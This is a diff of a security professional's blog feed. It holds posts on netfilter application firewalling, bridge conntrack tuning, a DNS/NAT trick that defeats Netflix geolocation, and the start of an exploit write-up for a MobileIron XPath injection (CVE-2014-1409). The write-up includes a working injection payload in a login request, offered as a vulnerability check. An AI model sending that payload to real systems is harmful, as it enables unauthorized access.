@@ -1,12 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>NextGen$'s blog</title><link href="http://florent.daigniere.com/" rel="alternate"></link><link href="http://florent.daigniere.com/feeds/all.atom.xml" rel="self"></link><id>http://florent.daigniere.com/</id><updated>2015-07-26T21:45:00+01:00</updated><entry><title>Application firewalling with netfilter (part 2)</title><link href="http://florent.daigniere.com/posts/2015/07/application-firewalling-with-netfilter-part-2/" rel="alternate"></link><updated>2015-07-26T21:45:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:florent.daigniere.com,2015-07-26:posts/2015/07/application-firewalling-with-netfilter-part-2/</id><summary type="html">&lt;p&gt;Last time we've looked into &lt;a class="reference external" href="http://florent.daigniere.com/posts/2015/07/application-firewalling-with-netfilter/"&gt;how to do application firewalling with netfilter&lt;/a&gt; and came up with an answer whose dependencies aren't shipped by mainstream distributions just yet. Today we will find another way of doing the same thing on with the tools everyone have.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# install dependencies&lt;/span&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>NextGen$'s blog</title><link href="/" rel="alternate"></link><link href="//florent.daigniere.com/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2015-07-26T21:45:00+01:00</updated><entry><title>Application firewalling with netfilter (part 2)</title><link href="/posts/2015/07/application-firewalling-with-netfilter-part-2/" rel="alternate"></link><published>2015-07-26T21:45:00+01:00</published><updated>2015-07-26T21:45:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:None,2015-07-26:/posts/2015/07/application-firewalling-with-netfilter-part-2/</id><summary type="html">&lt;p&gt;Last time we've looked into &lt;a class="reference external" href="/posts/2015/07/application-firewalling-with-netfilter/"&gt;how to do application firewalling with netfilter&lt;/a&gt; and came up with an answer whose dependencies aren't shipped by mainstream distributions just yet. Today we will find another way of doing the same thing on with the tools everyone have.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# install dependencies&lt;/span&gt;
+sudo apt-get install sudo …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Last time we've looked into &lt;a class="reference external" href="/posts/2015/07/application-firewalling-with-netfilter/"&gt;how to do application firewalling with netfilter&lt;/a&gt; and came up with an answer whose dependencies aren't shipped by mainstream distributions just yet. Today we will find another way of doing the same thing on with the tools everyone have.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# install dependencies&lt;/span&gt;
 sudo apt-get install sudo
 
-&lt;span class="c"&gt;# create a user called &amp;#39;internet&amp;#39;&lt;/span&gt;
+&lt;span class="c1"&gt;# create a user called &amp;#39;internet&amp;#39;&lt;/span&gt;
 sudo adduser internet
 
-&lt;span class="c"&gt;# setup the firewall&lt;/span&gt;
+&lt;span class="c1"&gt;# setup the firewall&lt;/span&gt;
 sudo iptables -F OUTPUT
 sudo iptables -P OUTPUT REJECT
 sudo iptables -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
@@ -20,33 +22,37 @@ sudo cat &amp;gt; /etc/sudoers.d/internet &lt;span class="s"&gt;&amp;lt;&amp;lt;
 &lt;span class="s"&gt;$LOGNAME ALL=(internet) NOPASSWD: /usr/bin/iceweasel&lt;/span&gt;
 &lt;span class="s"&gt;EOT&lt;/span&gt;
 
-&lt;span class="c"&gt;# give access to our MIT-MAGIC-COOKIE to everyone locally (bad idea! man xauth to understand why)&lt;/span&gt;
+&lt;span class="c1"&gt;# give access to our MIT-MAGIC-COOKIE to everyone locally (bad idea! man xauth to understand why)&lt;/span&gt;
 chmod a+rx &lt;span class="nv"&gt;$HOME&lt;/span&gt;
 chmod a+r &lt;span class="nv"&gt;$XAUTHORITY&lt;/span&gt;
 
-&lt;span class="c"&gt;# run firefox&lt;/span&gt;
+&lt;span class="c1"&gt;# run firefox&lt;/span&gt;
 sudo -u internet /usr/bin/iceweasel
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;That works... but is far from perfect. More details on why to follow in my next post.&lt;/p&gt;
-</summary><category term="sysadmin"></category><category term="blog"></category></entry><entry><title>Application firewalling with netfilter</title><link href="http://florent.daigniere.com/posts/2015/07/application-firewalling-with-netfilter/" rel="alternate"></link><updated>2015-07-23T15:08:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:florent.daigniere.com,2015-07-23:posts/2015/07/application-firewalling-with-netfilter/</id><summary type="html">&lt;p&gt;Today I've stumbled upon &lt;a class="reference external" href="https://linuxfr.org/forums/linux-general/posts/cas-d-utilisation-n-autoriser-que-firefox-a-sortir-sur-les-ports-http-s"&gt;a post&lt;/a&gt; from my friend &lt;a class="reference external" href="http://blog.tuttu.info/"&gt;Feth&lt;/a&gt;, asking whether allowing &lt;strong&gt;only firefox&lt;/strong&gt; to access the internet was possible on Linux... Of course it is! Here's one of the many ways:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# setup the firewall&lt;/span&gt;
+</content><category term="sysadmin"></category><category term="blog"></category></entry><entry><title>Application firewalling with netfilter</title><link href="/posts/2015/07/application-firewalling-with-netfilter/" rel="alternate"></link><published>2015-07-23T15:08:00+01:00</published><updated>2015-07-23T15:08:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:None,2015-07-23:/posts/2015/07/application-firewalling-with-netfilter/</id><summary type="html">&lt;p&gt;Today I've stumbled upon &lt;a class="reference external" href="https://linuxfr.org/forums/linux-general/posts/cas-d-utilisation-n-autoriser-que-firefox-a-sortir-sur-les-ports-http-s"&gt;a post&lt;/a&gt; from my friend &lt;a class="reference external" href="http://blog.tuttu.info/"&gt;Feth&lt;/a&gt;, asking whether allowing &lt;strong&gt;only firefox&lt;/strong&gt; to access the internet was possible on Linux... Of course it is! Here's one of the many ways:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# setup the firewall&lt;/span&gt;
+sudo iptables -F OUTPUT
+sudo iptables -P OUTPUT REJECT
+sudo iptables -A OUTPUT -m …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Today I've stumbled upon &lt;a class="reference external" href="https://linuxfr.org/forums/linux-general/posts/cas-d-utilisation-n-autoriser-que-firefox-a-sortir-sur-les-ports-http-s"&gt;a post&lt;/a&gt; from my friend &lt;a class="reference external" href="http://blog.tuttu.info/"&gt;Feth&lt;/a&gt;, asking whether allowing &lt;strong&gt;only firefox&lt;/strong&gt; to access the internet was possible on Linux... Of course it is! Here's one of the many ways:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# setup the firewall&lt;/span&gt;
 sudo iptables -F OUTPUT
 sudo iptables -P OUTPUT REJECT
 sudo iptables -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
 sudo iptables -A OUTPUT -p tcp --dport &lt;span class="m"&gt;80&lt;/span&gt; --syn -m cgroup --cgroup &lt;span class="m"&gt;1&lt;/span&gt; -j ACCEPT
 sudo iptables -A OUTPUT -p tcp --dport &lt;span class="m"&gt;443&lt;/span&gt; --syn -m cgroup --cgroup &lt;span class="m"&gt;1&lt;/span&gt; -j ACCEPT
 
-&lt;span class="c"&gt;# create a cgroup named firefox&lt;/span&gt;
+&lt;span class="c1"&gt;# create a cgroup named firefox&lt;/span&gt;
 sudo cgcreate -t &lt;span class="nv"&gt;$LOGNAME&lt;/span&gt;:users -a &lt;span class="nv"&gt;$LOGNAME&lt;/span&gt;:users -g net_cls:firefox
-&lt;span class="c"&gt;# allocate an identifier to the cgroup&lt;/span&gt;
-&lt;span class="nb"&gt;echo &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; /sys/fs/cgroup/net_cls/firefox/net_cls.classid
+&lt;span class="c1"&gt;# allocate an identifier to the cgroup&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; /sys/fs/cgroup/net_cls/firefox/net_cls.classid
 
-&lt;span class="c"&gt;# run firefox&lt;/span&gt;
+&lt;span class="c1"&gt;# run firefox&lt;/span&gt;
 cgexec -g net_cls:firefox iceweasel &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;The following commands might be useful to debug what's going on:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ls&lt;/span&gt; -ld /sys/fs/cgroup/net_cls/firefox/
-drwx------ &lt;span class="m"&gt;2&lt;/span&gt; nextgens users &lt;span class="m"&gt;0&lt;/span&gt; Jul &lt;span class="m"&gt;23&lt;/span&gt; 18:03 /sys/fs/cgroup/net_cls/firefox/
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;$ls&lt;/span&gt; -ld /sys/fs/cgroup/net_cls/firefox/
+drwx------ &lt;span class="m"&gt;2&lt;/span&gt; nextgens users &lt;span class="m"&gt;0&lt;/span&gt; Jul &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="m"&gt;18&lt;/span&gt;:03 /sys/fs/cgroup/net_cls/firefox/
 &lt;span class="nv"&gt;$cat&lt;/span&gt; /sys/fs/cgroup/net_cls/firefox/cgroup.procs
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Attentive readers will notice that the above doesn't work for at least two reasons:&lt;/p&gt;
@@ -56,27 +62,29 @@ drwx------ &lt;span class="m"&gt;2&lt;/span&gt; nextgens users &lt;span class="m
 &lt;/ul&gt;
 &lt;p&gt;Tomorrow I might blog about how to recompile/repackage a recent-enough version of iptables; Or maybe a different way of doing the same thing involving SElinux and/or network namespaces; Or maybe rant on how useless application firewalls are (both as a security control and an anti-privacy leakage mitigation).&lt;/p&gt;
 &lt;p&gt;Feel free to let me know what you prefer in the comments.&lt;/p&gt;
-</summary><category term="sysadmin"></category><category term="blog"></category></entry><entry><title>Disabling connection tracking on bridge interfaces created by libvirt</title><link href="http://florent.daigniere.com/posts/2015/07/disabling-connection-tracking-on-bridge-interfaces-created-by-libvirt/" rel="alternate"></link><updated>2015-07-22T10:02:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:florent.daigniere.com,2015-07-22:posts/2015/07/disabling-connection-tracking-on-bridge-interfaces-created-by-libvirt/</id><summary type="html">&lt;p&gt;Today I got bitten by a problem I've already encountered in the past... and as I didn't document it properly, I had to google it again! Let this blog entry be a more permanent documentation than the previous one.&lt;/p&gt;
+</content><category term="sysadmin"></category><category term="blog"></category></entry><entry><title>Disabling connection tracking on bridge interfaces created by libvirt</title><link href="/posts/2015/07/disabling-connection-tracking-on-bridge-interfaces-created-by-libvirt/" rel="alternate"></link><published>2015-07-22T10:02:00+01:00</published><updated>2015-07-22T10:02:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:None,2015-07-22:/posts/2015/07/disabling-connection-tracking-on-bridge-interfaces-created-by-libvirt/</id><summary type="html">&lt;p&gt;Today I got bitten by a problem I've already encountered in the past... and as I didn't document it properly, I had to google it again! Let this blog entry be a more permanent documentation than the previous one.&lt;/p&gt;
+&lt;p&gt;Early in the morning, the supervision system has started alerting me …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Today I got bitten by a problem I've already encountered in the past... and as I didn't document it properly, I had to google it again! Let this blog entry be a more permanent documentation than the previous one.&lt;/p&gt;
 &lt;p&gt;Early in the morning, the supervision system has started alerting me that the response time of one of the virtualization hosts we use at &lt;a class="reference external" href="https://www.trustmatta.com/"&gt;Matta&lt;/a&gt; is going through the roof; making everything 'feel' slow.&lt;/p&gt;
 &lt;p&gt;Connecting to the system through SSH is already taking tens of seconds, indicating that something is indeed seriously wrong. Modern linux systems use resource isolation in the form of &lt;a class="reference external" href="https://www.kernel.org/doc/Documentation/cgroups/cgroups.txt"&gt;cgroups&lt;/a&gt; and are quite resilient to obnoxious programs chewing up resources; The traditional &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Fork_bomb"&gt;fork-bomb&lt;/a&gt; is a lot less effective than it used to be thanks to these improvements.&lt;/p&gt;
 &lt;p&gt;The following command can be used to see how the processes are grouped by your init system:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;ps xawf -eo pid,user,cgroup,args
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ps xawf -eo pid,user,cgroup,args
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;At this stage, when I've finally obtained a command prompt on the remote server, I knew that the cause of the problem was kernel-related. So my first command was &lt;cite&gt;dmesg&lt;/cite&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;...&lt;/span&gt;
 &lt;span class="go"&gt;nf_conntrack: table full, dropping packet.&lt;/span&gt;
 &lt;span class="go"&gt;...&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;This message is familiar; being a penetration testing company, we are using and abusing of advanced TCP trickery, confusing the hell out of any stateful firewall in the way. Tonight, the culprit was &lt;a class="reference external" href="https://nmap.org/"&gt;Nmap&lt;/a&gt; conducting a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Port_scanner#SYN_scanning"&gt;SYN scan&lt;/a&gt;...&lt;/p&gt;
 &lt;p&gt;No matter how much resources I could allocate to the tracking table, it will never be big enough... and fundamentally, there is no reason to filter the traffic bridged from the VM to the network using a stateful firewall. In the past I've decided to deal with that specific problem by setting a rule to tell netfilter to specifically disregard the traffic flowing through the bridged devices. This was achieved with the following command:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;iptables --table raw -A PREROUTING -m physdev --physdev-is-bridged -j NOTRACK
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;iptables --table raw -A PREROUTING -m physdev --physdev-is-bridged -j NOTRACK
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;It worked well; up until the point where a new rule was introduced, negating its effects. The improved solution reads:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nb"&gt;echo &lt;/span&gt;net.bridge.bridge-nf-call-iptables&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt; /etc/sysctl.conf
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; net.bridge.bridge-nf-call-iptables&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt; /etc/sysctl.conf
 sysctl -p
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Live and learn as they say!&lt;/p&gt;
-</summary><category term="sysadmin"></category><category term="blog"></category></entry><entry><title>Netflix ultimate geolocation bypass with an edgerouter</title><link href="http://florent.daigniere.com/posts/2015/01/netflix-ultimate-geolocation-bypass-with-an-edgerouter/" rel="alternate"></link><updated>2015-01-05T19:06:00+00:00</updated><author><name>Florent Daignière</name></author><id>tag:florent.daigniere.com,2015-01-05:posts/2015/01/netflix-ultimate-geolocation-bypass-with-an-edgerouter/</id><summary type="html">&lt;p&gt;It looks like &lt;a class="reference external" href="http://www.engadget.com/2015/01/03/netflix-clamps-down-on-vpns/"&gt;Netflix has updated their geolocation code&lt;/a&gt;... attempting to prevent their users from watching content intended for other regions. This post explores a few technical avenues one might consider to bypass it.&lt;/p&gt;
+</content><category term="sysadmin"></category><category term="blog"></category></entry><entry><title>Netflix ultimate geolocation bypass with an edgerouter</title><link href="/posts/2015/01/netflix-ultimate-geolocation-bypass-with-an-edgerouter/" rel="alternate"></link><published>2015-01-05T19:06:00+00:00</published><updated>2015-01-05T19:06:00+00:00</updated><author><name>Florent Daignière</name></author><id>tag:None,2015-01-05:/posts/2015/01/netflix-ultimate-geolocation-bypass-with-an-edgerouter/</id><summary type="html">&lt;p&gt;It looks like &lt;a class="reference external" href="http://www.engadget.com/2015/01/03/netflix-clamps-down-on-vpns/"&gt;Netflix has updated their geolocation code&lt;/a&gt;... attempting to prevent their users from watching content intended for other regions. This post explores a few technical avenues one might consider to bypass it.&lt;/p&gt;
+&lt;p&gt;Googling around, it becomes increasingly clear that many people are making a living out of selling …&lt;/p&gt;</summary><content type="html">&lt;p&gt;It looks like &lt;a class="reference external" href="http://www.engadget.com/2015/01/03/netflix-clamps-down-on-vpns/"&gt;Netflix has updated their geolocation code&lt;/a&gt;... attempting to prevent their users from watching content intended for other regions. This post explores a few technical avenues one might consider to bypass it.&lt;/p&gt;
 &lt;p&gt;Googling around, it becomes increasingly clear that many people are making a living out of selling bypasses both in the form of technical solutions and support. The signal over noise ratio is very low and after 15mins it has become increasingly clear that tcpdumping the traffic is the way to find out &amp;quot;what they've changed&amp;quot;.&lt;/p&gt;
 &lt;p&gt;Up until this month, users tend to use two different techniques to get around the restrictions. They either subscribe to a VPN service (in addition to their netflix subscription!) or what providers calls a &amp;quot;smart DNS&amp;quot;. Both solutions are unacceptable to me as they are both completely inadequate security wise. &lt;strong&gt;Why should I trust a random system on the internet with my internet traffic when I don't have to?&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;To give you an illustrated example of why it's a bad idea, let's talk about what seems to be the most popular solution: &lt;a class="reference external" href="https://hola.org/"&gt;Hola&lt;/a&gt;; it's free as in free-beer. Turns out that these guys are operating a peer to peer network of proxies, reselling your bandwidth through their &lt;a class="reference external" href="https://luminati.io/"&gt;Luminati&lt;/a&gt; service. One should keep in mind that, on the internet, if you're not paying, odds are you're the product!&lt;/p&gt;
@@ -87,15 +95,15 @@ sysctl -p
 &lt;li&gt;FAQ from ISPs&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Of course, &lt;a class="reference external" href="https://en.wikipedia.org/wiki/DNSChanger"&gt;I wouldn't trust any of them with my DNS traffic&lt;/a&gt; (unlike most of the tutorials I've found on the internet)... So instead of changing the system's resolver to one of them, here is the edgerouter command I've used:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="go"&gt;set service dns forwarding options server=/netflix.com/$ip&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;set service dns forwarding options server=/netflix.com/$ip&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;This ensures that only the traffic going to *.netflix.com will be queried through that DNS resolver.&lt;/p&gt;
 &lt;p&gt;This has been working for years, up until this month where the application has been updated. Ever since, the geolocation finds out which zone I'm entitled to. TCPDumping the traffic has once again proved useful and told me that now Netflix is doing two different DNS queries using both the system's configured resolver and a hardcoded one (Google's). It then decides which zone you're in, based on the result of both, trusting Google's over your local DNS. So yes; if you used to bypass their zone restriction using DNS, they know it ;)&lt;/p&gt;
 &lt;p&gt;My initial (naive) attempt was to try out what happens when Google can't be reached. The following command does just that:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="go"&gt;set protocols static route 8.8.8.8 blackhole&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;set protocols static route 8.8.8.8 blackhole&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;This works for some definition of &amp;quot;work&amp;quot;. The stream will eventually start but you will have to wait for timeouts while navigating and picking your movie; making the whole trick sub-optimal. A better solution is to do destination NAT and pretend that our local resolver is Google's. it can be achieved using the following config:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="go"&gt;edit service nat rule 4999&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;edit service nat rule 4999&lt;/span&gt;
 &lt;span class="go"&gt; description netflix&lt;/span&gt;
 &lt;span class="go"&gt; destination {&lt;/span&gt;
 &lt;span class="go"&gt;     address 8.8.8.8&lt;/span&gt;
@@ -109,11 +117,12 @@ sysctl -p
 &lt;span class="go"&gt; type destination&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Using iptables, it would look like that:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;iptables -t nat -A PREROUTING -d 8.8.8.8/32 -i &lt;span class="nv"&gt;$LAN_IF&lt;/span&gt; -p udp -m udp --dport &lt;span class="m"&gt;53&lt;/span&gt; -j DNAT --to-destination &lt;span class="nv"&gt;$LAN_IP&lt;/span&gt;
-iptables -t nat -A PREROUTING -d 8.8.8.8/32 -i &lt;span class="nv"&gt;$LAN_IF&lt;/span&gt; -p tcp -m tcp --dport &lt;span class="m"&gt;53&lt;/span&gt; -j DNAT --to-destination &lt;span class="nv"&gt;$LAN_IP&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;iptables -t nat -A PREROUTING -d &lt;span class="m"&gt;8&lt;/span&gt;.8.8.8/32 -i &lt;span class="nv"&gt;$LAN_IF&lt;/span&gt; -p udp -m udp --dport &lt;span class="m"&gt;53&lt;/span&gt; -j DNAT --to-destination &lt;span class="nv"&gt;$LAN_IP&lt;/span&gt;
+iptables -t nat -A PREROUTING -d &lt;span class="m"&gt;8&lt;/span&gt;.8.8.8/32 -i &lt;span class="nv"&gt;$LAN_IF&lt;/span&gt; -p tcp -m tcp --dport &lt;span class="m"&gt;53&lt;/span&gt; -j DNAT --to-destination &lt;span class="nv"&gt;$LAN_IP&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;That works wonders and is the ultimate solution to me. It's not wasting bandwidth encapsulating traffic through a tunnel nor trusting random unknowns on the internet to route it for me... and it's free!&lt;/p&gt;
-</summary><category term="edgerouter"></category><category term="sysadmin"></category><category term="blog"></category></entry><entry><title>CVE-2014-1409 or the sad tale of an XPath injection affecting mobileiron products</title><link href="http://florent.daigniere.com/posts/2014/06/cve-2014-1409-or-the-sad-tale-of-an-xpath-injection-affecting-mobileiron-products/" rel="alternate"></link><updated>2014-06-23T11:06:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:florent.daigniere.com,2014-06-23:posts/2014/06/cve-2014-1409-or-the-sad-tale-of-an-xpath-injection-affecting-mobileiron-products/</id><summary type="html">&lt;p&gt;Following up on my last post about &lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injections, I will document part of the process we went through to exploit &lt;a class="reference external" href="https://www.trustmatta.com/advisories/MATTA-2013-004.txt"&gt;CVE-2014-1409&lt;/a&gt; and hopefully convince a few that this category of bugs is no joke and should be looked for during pentests.&lt;/p&gt;
+</content><category term="edgerouter"></category><category term="sysadmin"></category><category term="blog"></category></entry><entry><title>CVE-2014-1409 or the sad tale of an XPath injection affecting mobileiron products</title><link href="/posts/2014/06/cve-2014-1409-or-the-sad-tale-of-an-xpath-injection-affecting-mobileiron-products/" rel="alternate"></link><published>2014-06-23T11:06:00+01:00</published><updated>2014-06-23T11:06:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:None,2014-06-23:/posts/2014/06/cve-2014-1409-or-the-sad-tale-of-an-xpath-injection-affecting-mobileiron-products/</id><summary type="html">&lt;p&gt;Following up on my last post about &lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injections, I will document part of the process we went through to exploit &lt;a class="reference external" href="https://www.trustmatta.com/advisories/MATTA-2013-004.txt"&gt;CVE-2014-1409&lt;/a&gt; and hopefully convince a few that this category of bugs is no joke and should be looked for during pentests.&lt;/p&gt;
+&lt;p&gt;So, what about it? Well, let me tell …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Following up on my last post about &lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injections, I will document part of the process we went through to exploit &lt;a class="reference external" href="https://www.trustmatta.com/advisories/MATTA-2013-004.txt"&gt;CVE-2014-1409&lt;/a&gt; and hopefully convince a few that this category of bugs is no joke and should be looked for during pentests.&lt;/p&gt;
 &lt;p&gt;So, what about it? Well, let me tell you a story. The story of a remote-root which doesn't involve any memory corruption on a very widely used and deployed appliance sold by a security vendor.&lt;/p&gt;
 &lt;p&gt;In terms of exploitation methodology, here is what needs doing:&lt;/p&gt;
 &lt;blockquote&gt;
@@ -127,28 +136,28 @@ iptables -t nat -A PREROUTING -d 8.8.8.8/32 -i &lt;span class="nv"&gt;$LAN_IF&lt
 &lt;/blockquote&gt;
 &lt;p&gt;All of the above has been described in &lt;a class="reference external" href="https://www.trustmatta.com/advisories/MATTA-2013-004.txt"&gt;MATTA-2013-004&lt;/a&gt;; The vendor has issued a patch and it was made public on 02-04-14. I feel like releasing more details will help other members of the security community develop signatures for IDSes and plugins for vulnerability scanners.&lt;/p&gt;
 &lt;p&gt;The two HTTP requests I use to check whether an appliance is vulnerable are the following:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;POST&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;j_spring_security_check&lt;/span&gt; &lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;j_spring_security_check&lt;/span&gt; &lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;
 &lt;span class="n"&gt;Host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;XXX&lt;/span&gt;
 &lt;span class="n"&gt;Referer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;XXX&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jsp&lt;/span&gt;
 &lt;span class="n"&gt;Connection&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;close&lt;/span&gt;
 &lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;urlencoded&lt;/span&gt;
 &lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;48&lt;/span&gt;
 
-&lt;span class="n"&gt;j_username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;and+concat(&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;)=&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;j_password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;
+&lt;span class="n"&gt;j_username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;and+concat(&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;)=&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;j_password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
